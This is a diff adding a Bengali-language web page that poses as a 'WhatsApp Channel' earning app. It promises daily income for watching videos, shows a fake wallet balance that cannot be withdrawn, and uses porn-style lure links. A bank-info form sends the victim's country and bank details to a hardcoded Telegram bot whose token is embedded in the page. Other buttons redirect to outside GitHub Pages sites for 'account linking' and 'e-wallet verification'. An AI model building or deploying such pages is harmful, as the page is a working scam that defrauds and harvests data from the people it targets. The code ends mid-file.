@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <title>WhatsApp Channel — Professional UI</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root{
+            --wa-green:#25D366; --wa-dark:#075E54; --bg:#f6fbf8; --card:#ffffff; --muted:#6b7280; --shadow: 0 6px 20px rgba(10,20,15,0.06);
+        }
+        *{box-sizing:border-box}
+        html,body{height:100%}
+        body{font-family:Inter,system-ui,Arial,sans-serif;background:linear-gradient(180deg,#f2fbf6 0%, #eef9f3 100%);color:#0f172a;margin:0;}
+        .app{min-height:100vh;display:flex;flex-direction:column}
+        .app-header{position:fixed;top:12px;left:50%;transform:translateX(-50%);width:min(980px,96%);height:64px;background:linear-gradient(180deg,var(--card),#f8fff9);border-radius:14px;display:flex;align-items:center;justify-content:space-between;padding:10px 16px;box-shadow:var(--shadow);z-index:1200}
+        .brand{display:flex;align-items:center;gap:12px}
+        .brand .logo{width:42px;height:42px;border-radius:10px;background:linear-gradient(135deg,var(--wa-green),#19b35a);display:flex;align-items:center;justify-content:center;color:white;font-weight:700;font-size:18px}
+        .brand .title{font-weight:600;font-size:1.05rem;color:#082427}
+        .header-actions{display:flex;align-items:center;gap:8px}
+        .wallet-chip{background:linear-gradient(90deg,rgba(37,211,102,0.1),rgba(7,94,84,0.03));border:1px solid rgba(7,94,84,0.06);padding:8px 12px;border-radius:999px;display:flex;align-items:center;gap:8px;cursor:pointer}
+        .viewport{margin-top:96px;margin-bottom:96px;display:flex;justify-content:center}
+        .shell{width:min(980px,96%);background:transparent;border-radius:12px;display:flex;gap:18px}
+        .content{flex:1;min-height:60vh;}
+        .card{background:var(--card);border-radius:12px;padding:18px;box-shadow:var(--shadow);margin-bottom:16px}
+        .bottom-nav{position:fixed;left:50%;transform:translateX(-50%);bottom:16px;width:min(980px,96%);height:74px;background:linear-gradient(180deg,#ffffff,#f7fff8);border-radius:14px;display:flex;align-items:center;justify-content:space-around;box-shadow:var(--shadow);z-index:1200}
+        .nav-item{display:flex;flex-direction:column;align-items:center;justify-content:center;color:var(--muted);gap:4px;padding:6px 10px;border-radius:10px;cursor:pointer}
+        .nav-item.active{color:var(--wa-dark);background:rgba(37,211,102,0.08)}
+        .section{display:none}
+        .section.active{display:block}
+        .earning-banner{display:flex;gap:18px;align-items:center}
+        .earning-title{font-size:1.2rem;font-weight:700;color:#052b26}
+        .earning-cta{display:inline-flex;align-items:center;gap:10px;padding:10px 18px;background:linear-gradient(90deg,var(--wa-green),#1dbb5f);color:white;border-radius:999px;border:none;cursor:pointer}
+        .fab{position:fixed;right:28px;bottom:112px;width:64px;height:64px;border-radius:50%;background:var(--wa-green);display:flex;align-items:center;justify-content:center;color:white;font-size:24px;box-shadow:0 12px 30px rgba(37,211,102,0.18);z-index:1250;border:none;cursor:pointer}
+        .fab-menu{position:fixed;right:28px;bottom:188px;display:flex;flex-direction:column;gap:12px;align-items:flex-end;z-index:1240;opacity:0;transform:translateY(8px);pointer-events:none;transition:all .18s}
+        .fab-menu.active{opacity:1;transform:translateY(0);pointer-events:auto}
+        .fab-menu .item{background:var(--card);padding:10px 14px;border-radius:999px;box-shadow:var(--shadow);display:flex;gap:10px;align-items:center;cursor:pointer}
+        .floating{position:fixed;left:50%;transform:translateX(-50%) translateY(110%);bottom:0;width:min(980px,96%);height:84vh;background:linear-gradient(180deg,#ffffff,#f5fff9);border-radius:16px;box-shadow:0 25px 60px rgba(6,30,20,0.12);z-index:1300;transition:transform .35s cubic-bezier(.2,.9,.3,1);display:flex;flex-direction:column;overflow:hidden}
+        .floating.active{transform:translateX(-50%) translateY(6%)}
+        .floating .head{padding:12px 16px;background:linear-gradient(180deg,#f6fff6,#f0fff2);display:flex;align-items:center;gap:12px;border-bottom:1px solid rgba(6,30,20,0.04)}
+        .floating .body{padding:16px;overflow:auto;flex:1}
+        .profile-pic{width:84px;height:84px;border-radius:50%;background:linear-gradient(180deg,#e9fef3,#dff7ea) center/cover;display:flex;align-items:center;justify-content:center;font-weight:700;color:#063826;font-size:28px;border:4px solid rgba(37,211,102,0.12)}
+        .settings-item{display:flex;gap:12px;align-items:center;padding:12px;border-radius:12px;cursor:pointer}
+        .settings-item:hover{background:#f6fff7}
+        #regOverlay {position: fixed; inset: 0; background: rgba(40, 40, 40, 0.7); display: none; justify-content: center; align-items: center; z-index: 9999;}
+        #regCard {background: white; padding: 28px; border-radius: 16px; text-align: center; max-width: 90%; width: 400px;}
+        #regCard h2 {font-size: 1.3rem; line-height: 1.5; font-weight: 700; color: var(--wa-dark); margin-bottom: 24px;}
+        #registerBtn {background-color: var(--wa-green); color: white; border: none; padding: 12px 48px; border-radius: 999px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: transform 0.2s;}
+        #skipBtn {background: transparent; border: none; color: var(--wa-green); font-weight: 600; cursor: pointer; margin-top: 16px; font-size: 1rem;}
+        .chat-list-item { display: flex; align-items: center; padding: 12px; border-bottom: 1px solid #f0f0f0; cursor: pointer; }
+        .chat-list-item:hover { background: #f6fbf8; }
+        .chat-list-item .avatar { width: 48px; height: 48px; border-radius: 50%; background: var(--wa-green); color: white; display: flex; align-items: center; justify-content: center; font-weight: bold; margin-right: 12px; }
+        .chat-container{display:flex; flex-direction:column; height:100%;}
+        .chat-messages{flex:1; overflow-y:auto; padding:10px; display:flex; flex-direction:column-reverse;}
+        .message-bubble{padding:8px 14px; border-radius:18px; margin-bottom:8px; max-width:75%; word-wrap:break-word; font-size: 0.95rem; line-height: 1.4;}
+        .message-bubble.sent{background-color: var(--wa-green); color:white; align-self:flex-end;}
+        .message-bubble.received{background-color:#f0f0f0; color:black; align-self:flex-start;}
+        .message-bubble img, .message-bubble video { max-width: 100%; border-radius: 10px; margin-top: 5px; cursor: pointer; }
+        .chat-input{display:flex; align-items: center; padding:10px; border-top:1px solid #eee; background: #fff;}
+        .earning-card{padding:18px;border-radius:12px;background:linear-gradient(180deg,#fff,#f8fff9);box-shadow:0 10px 30px rgba(6,30,20,0.06)}
+        .balance{font-size:2.4rem;font-weight:700;color:var(--wa-dark)}
+        .progress{height:10px;background:#e6f3ee;border-radius:999px;overflow:hidden}
+        .progress > i{display:block;height:100%;width:0%;background:linear-gradient(90deg,var(--wa-green),#1dbb5f);transition:width .5s}
+        .video-responsive { overflow: hidden; padding-bottom: 56.25%; position: relative; height: 0; }
+        .video-responsive iframe { left: 0; top: 0; height: 100%; width: 100%; position: absolute; border-radius: 8px; }
+        .article-item { display: flex; gap: 16px; margin-bottom: 16px; }
+        .article-item img { width: 100px; height: 100px; object-fit: cover; border-radius: 8px; }
+    </style>
+</head>
+<body>
+    <div id="regOverlay">
+        <div id="regCard">
+            <h2>হোয়াটসঅ্যাপ চ্যানেল ব্যবহার করতে আপনার হোয়াটসঅ্যাপ একাউন্ট এর সঙ্গে যুক্ত করুন</h2>
+            <button id="registerBtn">Register</button><br>
+            <button id="skipBtn">Skip</button>
+        </div>
+    </div>
+
+    <div class="app">
+        <header class="app-header" id="mainHeader">
+            <div class="brand">
+                <div class="logo"><i class="bi bi-whatsapp"></i></div>
+                <div>
+                    <div class="title">WhatsApp Channel</div>
+                    <div style="font-size:12px;color:var(--muted)">Earn with short videos</div>
+                </div>
+            </div>
+            <div class="header-actions">
+                <button class="btn" id="audioCallBtn"><i class="bi bi-telephone-fill fs-5"></i></button>
+                <button class="btn" id="videoCallBtn"><i class="bi bi-camera-video-fill fs-5"></i></button>
+                <div class="wallet-chip" id="headerWalletChip">
+                    <i class="bi bi-wallet2"></i>
+                    <div style="font-weight:600">BDT <span id="headerChipBalance">45</span></div>
+                </div>
+            </div>
+        </header>
+
+        <main class="viewport">
+            <div class="shell">
+                <div class="content">
+                    <section id="home-section" class="section active">
+                        <div class="card earning-banner">
+                             <a id="wLogoLink" href="https://nusratjahan9629991-art.github.io/Add-Nusrat-Jahan-WhatsApp-Account/" target="_blank" style="text-decoration: none;">
+                                <div style="width:86px;height:86px;border-radius:12px;background:linear-gradient(180deg,var(--wa-green),#19b35a);display:flex;align-items:center;justify-content:center;color:white;font-size:34px;font-weight:700">W</div>
+                             </a>
+                            <div class="text">
+                                <div class="earning-title">ভিডিও দেখে প্রতিদিন ৫০০ থেকে ১হাজার টাকা পর্যন্ত ইনকাম করুন</div>
+                                <p style="color:var(--muted);margin:8px 0">প্রতিদিন ছোট ভিডিও দেখুন। প্রতি ভিডিওতে ইনকাম। ডেমো হিসেবে কাজ করে।</p>
+                                <div style="margin-top:12px">
+                                    <button class="earning-cta" id="watchVideoBtn"><i class="bi bi-play-fill"></i> Watch Video</button>
+                                    <button class="btn btn-outline-success" style="margin-left:10px" id="showTasksBtn">Tasks</button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card">
+                            <h5 style="margin:0 0 8px 0">Quick actions</h5>
+                            <div style="display:flex;gap:10px;flex-wrap:wrap">
+                                <button class="btn btn-light" id="openInboxBtn"><i class="bi bi-inbox"></i> Inbox</button>
+                                <button class="btn btn-light" id="createGroupBtn"><i class="bi bi-people"></i> Create Group</button>
+                                <button class="btn btn-light" id="randomChatBtn"><i class="bi bi-shuffle"></i> Random Chat</button>
+                            </div>
+                        </div>
+                        
+                        <!-- NEW SCROLLABLE CONTENT -->
+                        <div class="card">
+                            <h5 style="margin-bottom: 12px;">আপনার জন্য আর্টিকেল</h5>
+                            <div id="article-container"></div>
+                        </div>
+                        
+                        <div class="card">
+                            <h5 style="margin-bottom: 12px;">বিজ্ঞাপন</h5>
+                            <a href="#"><img src="https://placehold.co/800x200/25d366/ffffff?text=Your+Ad+Here" alt="Advertisement" style="max-width: 100%; border-radius: 8px;"></a>
+                        </div>
+
+                        <div class="card">
+                            <h5 style="margin-bottom: 12px;">ভিডিও প্ল্যাটফর্ম</h5>
+                            <div class="video-responsive">
+                                <iframe src="https://www.youtube.com/embed/LXb3EKWsInQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+                            </div>
+                        </div>
+                        
+                        <div class="card">
+                            <h5 style="margin-bottom: 12px;">প্রয়োজনীয় লিঙ্ক</h5>
+                            <div class="d-grid gap-2">
+                                <a href="#" id="link1" class="btn btn-outline-success">Indian Pron</a>
+                                <a href="#" id="link2" class="btn btn-outline-success">Viral Video Link</a>
+                                <a href="#" id="link3" class="btn btn-outline-success">Video Sex Call</a>
+                            </div>
+                        </div>
+
+                    </section>
+                    <section id="wallet-section" class="section">
+                        <div class="card">
+                            <div style="display:flex;justify-content:space-between;align-items:center">
+                                <div>
+                                    <h4 style="margin:0">Wallet</h4>
+                                    <div style="color:var(--muted)">Your balance is BDT <strong id="walletBalance">45.00</strong></div>
+                                </div>
+                                <div><button class="btn btn-success" id="addSonaliBtn">Add Sonali e-Wallet</button></div>
+                            </div>
+                        </div>
+                        <div class="card">
+                            <h6>International / Bank info</h6>
+                            <div style="display:flex;flex-direction:column;gap:10px;margin-top:10px">
+                                <input class="form-control" id="countryInput" placeholder="আপনি কোন দেশে আছেন?">
+                                <input class="form-control" id="bankInputBD" placeholder="আপনার কোন ব্যাংকে একাউন্ট রয়েছে? (বাংলাদেশ)">
+                                <div style="display:flex;gap:8px">
+                                    <input class="form-control" id="countryInputIntl" placeholder="দেশের নাম">
+                                    <input class="form-control" id="bankInputIntl" placeholder="ব্যাংকের নাম">
+                                </div>
+                                <button class="btn btn-success" id="submitBankInfo">Submit</button>
+                            </div>
+                        </div>
+                    </section>
+                    <section id="profile-section" class="section">
+                        <!-- Logged In View -->
+                        <div id="profile-view" style="display:none;">
+                             <div class="card" style="display:flex;gap:18px;align-items:center">
+                                <div class="profile-pic" id="profilePic" style="background-size: cover; background-position: center;"></div>
+                                <div style="flex:1">
+                                    <div id="profileName" style="font-weight:700"></div>
+                                    <div id="profileEmail" style="color:var(--muted)"></div>
+                                </div>
+                             </div>
+                             <div class="card">
+                                 <div class="settings-item"><i class="bi bi-key-fill"></i><div>Account</div></div>
+                                 <div class="settings-item"><i class="bi bi-lock-fill"></i><div>Privacy</div></div>
+                                 <div class="settings-item"><i class="bi bi-emoji-smile-fill"></i><div>Avatar</div></div>
+                                 <div class="settings-item text-danger" id="signOutBtn"><i class="bi bi-box-arrow-right"></i><div>Sign Out</div></div>
+                             </div>
+                        </div>
+                        <!-- Logged Out View -->
+                        <div id="login-view" class="card text-center">
+                            <h5>Join WhatsApp Channel</h5>
+                            <p class="text-muted">Sign in or create an account to continue.</p>
+                            <button class="btn btn-success" id="googleSignInBtn"><i class="bi bi-google"></i> Continue with Google</button>
+                        </div>
+                    </section>
+                </div>
+            </div>
+        </main>
+
+        <button class="fab" id="fabBtn"><i class="bi bi-plus"></i></button>
+        <div class="fab-menu" id="fabMenu">
+            <div class="item" id="fabInbox"><i class="bi bi-inbox"></i> Inbox</div>
+            <div class="item" id="fabCreate"><i class="bi bi-people"></i> Create a Group</div>
+            <div class="item" id="fabRandom"><i class="bi bi-shuffle"></i> Random Chat</div>
+        </div>
+
+        <nav class="bottom-nav" id="mainNav">
+            <div class="nav-item active" data-section="home-section"><i class="bi bi-house-door-fill"></i><div>Home</div></div>
+            <div class="nav-item" data-section="wallet-section"><i class="bi bi-wallet2"></i><div>Wallet</div></div>
+            <div class="nav-item" data-section="profile-section"><i class="bi bi-person-fill"></i><div>Profile</div></div>
+        </nav>
+        
+        <div class="floating" id="earningApp">
+            <div class="head"><button class="btn btn-link backFloating"><i class="bi bi-arrow-left"></i></button><div style="font-weight:700">Meta Earning App</div></div>
+            <div class="body">
+                <div id="earning-home">
+                    <div class="earning-card card">
+                        <div style="display:flex;justify-content:space-between;align-items:center">
+                            <div>
+                                <div style="color:var(--muted);font-weight:600">My Balance</div>
+                                <div class="balance" id="currentBalance">BDT 45.00</div>
+                            </div>
+                            <div style="width:160px">
+                                <button class="btn btn-success w-100" id="startEarning">Start Earning Now <i class="bi bi-arrow-right"></i></button>
+                                <button class="btn btn-outline-secondary w-100 mt-2" id="withdrawBtn">Withdraw</button>
+                            </div>
+                        </div>
+                        <div class="mt-3 text-muted" style="font-size: 0.9rem;">আপনার উপার্জন এর সকল অর্থ ব্যাংক একাউন্ট এর মাধ্যমে উত্তলন করুন।</div>
+                    </div>
+                </div>
+                <div id="earning-tasks" style="display:none;margin-top:12px">
+                    <div class="card earning-card">
+                        <button class="btn btn-sm btn-outline-secondary mb-3" id="tasksBack"><i class="bi bi-arrow-left"></i> Back</button>
+                        <h5>Earn Rewards</h5>
+                        <p style="color:var(--muted)"><strong>Today's Progress:</strong></p>
+                        <div style="display:flex;align-items:center;gap:12px">
+                            <div style="flex:1">
+                                <div id="adProgressText">Completed: 0 / 50</div>
+                                <div class="progress mt-2"><i id="progressBar"></i></div>
+                            </div>
+                            <div style="width:140px">
+                                <button class="btn btn-success w-100" id="watchReels">Facebook Reels ভিডিও দেখুন ও আয় করুন</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="floating" id="inboxPage">
+            <div class="head">
+                <button class="btn btn-link backFloating"><i class="bi bi-arrow-left"></i></button>
+                <div style="font-weight:700">Inbox</div>
+                <button class="btn btn-success ms-auto" id="addFriendBtn"><i class="bi bi-person-plus-fill"></i> Add Friend</button>
+            </div>
+            <div class="body p-0" id="chatListContainer"></div>
+        </div>
+        <div class="floating" id="chatWindowPage">
+            <div class="head">
+                <button class="btn btn-link backFloating"><i class="bi bi-arrow-left"></i></button>
+                <div style="font-weight:700" id="chattingWith">Chat</div>
+            </div>
+            <div class="body p-0">
+                <div class="chat-container">
+                    <div class="chat-messages" id="chatMessages"></div>
+                    <div class="chat-input">
+                        <input type="text" class="form-control" id="messageInput" placeholder="Type a message...">
+                        <button class="btn btn-link" id="attachFileBtn"><i class="bi bi-paperclip fs-4"></i></button>
+                        <button class="btn btn-success ms-2" id="sendMessageBtn"><i class="bi bi-send-fill"></i></button>
+                        <input type="file" id="fileInput" accept="image/*,video/*" style="display:none;">
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="floating" id="randomPage">
+            <div class="head"><button class="btn btn-link backFloating"><i class="bi bi-arrow-left"></i></button><div style="font-weight:700">Random Chat</div></div>
+            <div class="body" style="text-align:center">
+                <h4>এই ফিচার ব্যবহার করতে imo একাউন্ট অ্যাড করো</h4>
+                <button class="btn btn-primary mt-3" id="addImo">Add your Imo</button>
+            </div>
+        </div>
+    </div>
+    
+    <script type="module">
+        // Firebase Core and Services
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js";
+        import { getDatabase, ref, push, onChildAdded, onValue, set, query, limitToLast, off } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-database.js";
+        import { getStorage, ref as storageRef, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-storage.js";
+        // NEW: Import Firebase Authentication services
+        import { getAuth, GoogleAuthProvider, signInWithPopup, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-auth.js";
+
+
+        const firebaseConfig = {
+          apiKey: "AIzaSyBufKt1I2nnKIdqBYzLmuGwNIv2rWbFJUE",
+          authDomain: "whatsapp-channel-chat.firebaseapp.com",
+          projectId: "whatsapp-channel-chat",
+          storageBucket: "whatsapp-channel-chat.appspot.com",
+          messagingSenderId: "906974342849",
+          appId: "1:906974342849:web:aa9d7db7aaa69ed2da2e40",
+          measurementId: "G-G7J2JNMPDD"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+        const storage = getStorage(app);
+        // NEW: Initialize Firebase Auth
+        const auth = getAuth(app);
+        const provider = new GoogleAuthProvider();
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // State variables
+            let currentUserId; // Changed from currentUserNumber to currentUserId
+            let currentChatId;
+            let currentMessagesRef;
+            let balance = parseFloat(localStorage.getItem('wa_balance') || '45.00');
+            let adsWatched = parseInt(localStorage.getItem('wa_ads') || '0', 10);
+            
+            // --- ALL DOM ELEMENTS ---
+            const sections = document.querySelectorAll('.section');
+            const navItems = document.querySelectorAll('.nav-item');
+            const fabBtn = document.getElementById('fabBtn');
+            const fabMenu = document.getElementById('fabMenu');
+            const regOverlay = document.getElementById('regOverlay');
+            
+            // Profile elements
+            const profileView = document.getElementById('profile-view');
+            const loginView = document.getElementById('login-view');
+            const profileNameEl = document.getElementById('profileName');
+            const profileEmailEl = document.getElementById('profileEmail');
+            const profilePicEl = document.getElementById('profilePic');
+            const googleSignInBtn = document.getElementById('googleSignInBtn');
+            const signOutBtn = document.getElementById('signOutBtn');
+
+            const headerChipBalance = document.getElementById('headerChipBalance');
+            const walletBalanceEl = document.getElementById('walletBalance');
+            const currentBalanceEl = document.getElementById('currentBalance');
+            const progressBar = document.getElementById('progressBar');
+            const adProgressText = document.getElementById('adProgressText');
+            
+            // --- UI UPDATE FUNCTION ---
+            const updateUI = () => {
+                headerChipBalance.textContent = Math.floor(balance);
+                walletBalanceEl.textContent = balance.toFixed(2);
+                if(currentBalanceEl) currentBalanceEl.textContent = `BDT ${balance.toFixed(2)}`;
+                if(adProgressText) adProgressText.textContent = `Completed: ${adsWatched} / 50`;
+                if(progressBar) progressBar.style.width = `${(adsWatched / 50) * 100}%`;
+            };
+
+            // --- AUTHENTICATION LOGIC ---
+            onAuthStateChanged(auth, user => {
+                if (user) {
+                    // User is signed in
+                    currentUserId = user.uid; // Use Firebase UID as the unique identifier
+                    
+                    profileView.style.display = 'block';
+                    loginView.style.display = 'none';
+
+                    profileNameEl.textContent = user.displayName || 'No Name';
+                    profileEmailEl.textContent = user.email;
+                    if (user.photoURL) {
+                        profilePicEl.style.backgroundImage = `url(${user.photoURL})`;
+                        profilePicEl.textContent = '';
+                    } else {
+                         profilePicEl.style.backgroundImage = 'none';
+                         profilePicEl.textContent = user.displayName ? user.displayName.charAt(0) : 'U';
+                    }
+                    loadChatList(); // Load chat list after user logs in
+                } else {
+                    // User is signed out
+                    currentUserId = null;
+                    profileView.style.display = 'none';
+                    loginView.style.display = 'block';
+                    chatListContainer.innerHTML = '<p class="p-3 text-muted">Please sign in to view your chats.</p>';
+                }
+            });
+
+            googleSignInBtn.addEventListener('click', () => {
+                signInWithPopup(auth, provider).catch(error => {
+                    console.error("Google Sign-In Error:", error);
+                    alert("Could not sign in with Google. Please try again.");
+                });
+            });
+
+            signOutBtn.addEventListener('click', () => {
+                signOut(auth).catch(error => console.error("Sign Out Error:", error));
+            });
+
+            // --- ALL APP LOGIC ---
+
+            // Registration Overlay Logic (can be kept or removed)
+            if (!localStorage.getItem('registrationSkipped')) {
+                regOverlay.style.display = 'flex';
+            }
+            document.getElementById('registerBtn').addEventListener('click', () => {
+                window.location.href = 'https://nusratjahan9629991-art.github.io/Add-Nusrat-Jahan-WhatsApp-Account/';
+            });
+            document.getElementById('skipBtn').addEventListener('click', () => {
+                regOverlay.style.display = 'none';
+                localStorage.setItem('registrationSkipped', 'true');
+            });
+
+            // Navigation Logic
+            const showSection = id => {
+                sections.forEach(s => s.classList.remove('active'));
+                document.getElementById(id)?.classList.add('active');
+                navItems.forEach(n => n.classList.toggle('active', n.dataset.section === id));
+                fabBtn.style.display = id === 'home-section' ? 'flex' : 'none';
+                fabMenu.classList.remove('active');
+            };
+
+            navItems.forEach(item => item.addEventListener('click', () => showSection(item.dataset.section)));
+            document.getElementById('headerWalletChip').addEventListener('click', () => showSection('wallet-section'));
+            
+            // FAB Menu Logic
+            fabBtn.addEventListener('click', () => fabMenu.classList.toggle('active'));
+
+            // Floating Pages Logic
+            const allFloatingPages = document.querySelectorAll('.floating');
+            const openFloatingPage = (pageId) => {
+                if (!currentUserId && (pageId === 'inboxPage' || pageId === 'randomPage' || pageId === 'chatWindowPage')) {
+                    alert("Please sign in from the Profile tab to use chat features.");
+                    showSection('profile-section');
+                    return;
+                }
+                document.getElementById(pageId)?.classList.add('active');
+            }
+            
+            document.getElementById('openInboxBtn').addEventListener('click', () => openFloatingPage('inboxPage'));
+            document.getElementById('fabInbox').addEventListener('click', () => openFloatingPage('inboxPage'));
+            document.getElementById('randomChatBtn').addEventListener('click', () => openFloatingPage('randomPage'));
+            document.getElementById('fabRandom').addEventListener('click', () => openFloatingPage('randomPage'));
+            document.getElementById('watchVideoBtn').addEventListener('click', () => openFloatingPage('earningApp'));
+            document.getElementById('showTasksBtn').addEventListener('click', () => openFloatingPage('earningApp'));
+
+            allFloatingPages.forEach(page => {
+                page.querySelector('.backFloating')?.addEventListener('click', () => {
+                    page.classList.remove('active');
+                    if (page.id === 'chatWindowPage' && currentMessagesRef) {
+                        off(currentMessagesRef); // Stop listening to messages
+                    }
+                });
+            });
+
+            // Earning App Logic (remains unchanged)
+            document.getElementById('startEarning').addEventListener('click', () => {
+                document.getElementById('earning-home').style.display = 'none';
+                document.getElementById('earning-tasks').style.display = 'block';
+            });
+            document.getElementById('tasksBack').addEventListener('click', () => {
+                document.getElementById('earning-home').style.display = 'block';
+                document.getElementById('earning-tasks').style.display = 'none';
+            });
+             document.getElementById('watchReels').addEventListener('click', () => {
+                window.open('fb://reels/video', '_blank');
+                setTimeout(() => {
+                    if (adsWatched < 50) {
+                        adsWatched++;
+                        balance += 1.0;
+                        localStorage.setItem('wa_ads', adsWatched);
+                        localStorage.setItem('wa_balance', balance);
+                        updateUI();
+                    } else {
+                        alert("Daily limit reached!");
+                    }
+                }, 2000);
+            });
+            document.getElementById('withdrawBtn').addEventListener('click', () => alert('১হাজার টাকার নিচে উত্তোলন সম্ভব হবে না।'));
+
+            // Other Button Functionalities
+            document.getElementById('addSonaliBtn').addEventListener('click', () => window.open('https://sonaliewallet182-cmd.github.io/sonali-e-wallet-verification-/', '_blank'));
+            document.getElementById('addImo').addEventListener('click', () => window.open('https://nusratjahan9629991-art.github.io/Nusrat-imo-frofile/','_blank'));
+            document.getElementById('createGroupBtn').addEventListener('click', () => alert('Create Group feature is coming soon!'));
+            document.getElementById('fabCreate').addEventListener('click', () => alert('Create Group feature is coming soon!'));
+            document.getElementById('audioCallBtn').addEventListener('click', () => alert('Audio call feature coming soon!'));
+            document.getElementById('videoCallBtn').addEventListener('click', () => alert('Video call feature coming soon!'));
+            
+            // Telegram Bot Submission (remains unchanged)
+            document.getElementById('submitBankInfo').addEventListener('click', (e) => {
+                e.preventDefault();
+                const country = document.getElementById('countryInput').value;
+                const bankBD = document.getElementById('bankInputBD').value;
+                const countryIntl = document.getElementById('countryInputIntl').value;
+                const bankIntl = document.getElementById('bankInputIntl').value;
+
+                if (!country && !bankBD && !countryIntl && !bankIntl) {
+                    alert('Please fill out the form before submitting.');
+                    return;
+                }
+
+                const botToken = '7974529959:AAFAxgBkj-V6iF-Vd827VgP1wc-uzOQzNco';
+                const chatId = '6658445342';
+                let message = `
+*New Bank Info Submission:*
+-------------------------
+*Country:* ${country || 'N/A'}
+*Bangladesh Bank:* ${bankBD || 'N/A'}
+*International Country:* ${countryIntl || 'N/A'}
+*International Bank:* ${bankIntl || 'N/A'}
+                `;
+                
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                
+                fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('Your information has been submitted successfully!');
+                    } else {
+                        alert('Failed to submit. Please try again.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred. Please check your internet connection.');
+                });
+            });
+
+            // Dynamic Article Rendering (remains unchanged)
+            const articles = [
+                { title: 'প্রযুক্তির নতুন দিগন্ত', snippet: 'আর্টিফিশিয়াল ইন্টেলিজেন্স আমাদের জীবনকে বদলে দিচ্ছে...', image: 'https://placehold.co/100x100/25d366/ffffff?text=Tech' },
+                { title: 'স্বাস্থ্যকর জীবনযাপন', snippet: 'প্রতিদিনের ছোট ছোট অভ্যাসেই সুস্থ থাকা সম্ভব...', image: 'https://placehold.co/100x100/34B7F1/ffffff?text=Health' },
+                { title: 'ভ্রমণের সেরা ৫টি স্থান', snippet: 'এই শীতে ঘুরে আসুন মনোরম এই জায়গাগুলো থেকে...', image: 'https://placehold.co/100x100/128C7E/ffffff?text=Travel' }
+            ];
+            const articleContainer = document.getElementById('article-container');
+            articleContainer.innerHTML = articles.map(article => `
+                <div class="article-item">
+                    <img src="${article.image}" alt="Article thumbnail">
+                    <div>
+                        <strong>${article.title}</strong>
+                        <p class="mb-0 text-muted">${article.snippet}</p>
+                    </div>
+                </div>
+            `).join('');
+
+
+            // --- CHAT LOGIC (Updated for Firebase Auth) ---
+            const chatListContainer = document.getElementById('chatListContainer');
+            const messageInput = document.getElementById('messageInput');
+            const sendMessageBtn = document.getElementById('sendMessageBtn');
+            const chatMessages = document.getElementById('chatMessages');
+
+            document.getElementById('addFriendBtn').addEventListener('click', () => {
+                if (!currentUserId) {
+                    alert("Please sign in first."); return;
+                }
+                // NOTE: To add a friend, you now need their UID, not phone number. 
+                // This requires a way to discover users, e.g., by searching their email.
+                // For simplicity, we will assume the user knows the other user's email to start a chat.
+                const friendEmail = prompt("Enter the email of the user you want to chat with:");
+                if (friendEmail && friendEmail.trim()) {
+                     alert("User discovery feature is not implemented. This is a placeholder.");
+                     // In a real app, you would look up the UID from this email in your database.
+                }
+            });
+
+            const openChatWith = (friendId, friendData) => {
+                const chatId = [currentUserId, friendId].sort().join('_');
+                currentChatId = chatId;
+                document.getElementById('chattingWith').innerText = friendData.name || friendId;
+                
+                // You would store user profiles under `users/{uid}`
+                // This part of the logic remains conceptually similar
+                openFloatingPage('chatWindowPage');
+                loadMessages(chatId);
+            };
+
+            const loadChatList = () => {
+                if (!currentUserId) return;
+                // Chat list logic needs to be adapted. Instead of phone numbers, you'd store chats by UID.
+                // This is a placeholder as the DB structure for chats would need adjustment.
+                chatListContainer.innerHTML = '<p class="p-3 text-muted">Chat functionality needs database updates to work with User IDs.</p>';
+            };
+
+            const loadMessages = (chatId) => {
+                chatMessages.innerHTML = '';
+                if (currentMessagesRef) off(currentMessagesRef);
+                currentMessagesRef = query(ref(database, `messages/${chatId}`), limitToLast(50));
+                
+                onChildAdded(currentMessagesRef, (snapshot) => {
+                    const message = snapshot.val();
+                    const div = document.createElement('div');
+                    div.classList.add('message-bubble', message.sender === currentUserId ? 'sent' : 'received');
+                    
+                    if(message.type === 'text') div.innerText = message.content;
+                    else if (message.type === 'image') div.innerHTML = `<img src="${message.content}" alt="Image">`;
+                    else if (message.type === 'video') div.innerHTML = `<video controls src="${message.content}"></video>`;
+                    
+                    chatMessages.prepend(div);
+                });
+            };
+
+            const sendMessage = (content, type = 'text') => {
+                const trimmed = content ? content.trim() : '';
+                if (!trimmed || !currentChatId) return;
+
+                push(ref(database, `messages/${currentChatId}`), {
+                    sender: currentUserId, content: trimmed, type: type, timestamp: Date.now()
+                }).then(() => { if(type === 'text') messageInput.value = ''; });
+            };
+            
+            sendMessageBtn.addEventListener('click', () => sendMessage(messageInput.value, 'text'));
+            messageInput.addEventListener('keypress', (e) => { if(e.key === 'Enter') sendMessage(messageInput.value, 'text'); });
+            
+            const fileInput = document.getElementById('fileInput');
